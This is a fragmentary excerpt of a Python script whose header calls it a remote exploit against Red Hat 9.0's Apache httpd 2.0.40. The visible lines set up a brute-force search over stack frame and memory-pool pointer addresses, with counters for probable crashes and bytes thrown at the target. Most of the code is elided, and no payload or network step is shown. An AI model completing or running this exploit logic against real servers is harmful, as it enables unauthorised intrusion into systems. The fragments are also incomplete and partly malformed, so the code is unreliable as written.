...
#a remote exploit against Red Hat 9.0's httpd-2.0.40-21
...
class WhackLoopException(Exception):
...
packet_size = int(sys.argv[3], 10)
whack_frame_pointer = start_address = int(sys.argv[4], 16)
...
whack_pool_pointer = int(whack_frame_pointer - 0x14)
...
whack_count = whack_ungrokkable_count = keyboard_interrupt_count = probable_crash_count = total_bytes_thrown = total_bytes_received = int(0)
not_time_to_quit = 1
...
try:
    while (not_time_to_quit and (whack_frame_pointer <= end_address)):
        ...
        for stack_offset in stack_offset_list:
            ...
            try_pool_pointer = whack_pool_pointer + int(stack_offset)
            if attempted_whack_pool_pointers:
        ...
        while (not_time_to_quit and len(pool_pointer_address_stack)):
            ...
            if (bogus_ass_pool_byte_count):
                ...
                # except   KeyboardInterrupt as  err_string):
